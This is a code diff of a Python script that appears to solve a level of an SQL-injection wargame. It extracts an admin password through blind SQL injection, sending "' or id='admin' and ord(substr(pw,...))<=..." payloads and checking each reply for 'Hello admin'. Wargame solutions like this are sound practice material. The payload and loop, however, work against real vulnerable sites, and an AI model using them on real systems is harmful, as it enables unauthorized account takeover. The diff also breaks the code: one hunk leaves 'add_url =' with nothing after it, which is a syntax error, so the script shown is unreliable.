@@ -6,7 +6,7 @@ pw= 우(50864)왕(50773)굳(44403)
 
 
 import urllib.request
-from urllib.parse import quote # url encoding func
+from urllib.parse import quote  # url encoding func
 
 url = 'http://los.rubiya.kr/xavis_04f071ecdadb4296361d2101e4a2c390.php?pw='
 # result = ""
@@ -14,6 +14,7 @@ result = "우왕굳"
 pwlen = 0
 
 __author__ = "goodasd123@naver.com - h4lo"
+
 
 def req(query):
     re = urllib.request.Request(query)
@@ -35,7 +36,8 @@ for i in range(1, 50):
 
 for i in range(5, pwlen + 1):
     for j in range(44032, 55203, 1000):  # 범위를 좁혀가며 찾아가자..
-        add_url = "' or id='admin' and ord(substr(pw, {}, 1))<='{}' -- ;".format(i, j)
+        add_url =
+        "' or id='admin' and ord(substr(pw, {}, 1))<='{}' -- ;".format(i, j)
         query = url + quote(add_url)
 
         if str(req(query).read()).find('Hello admin') != -1:
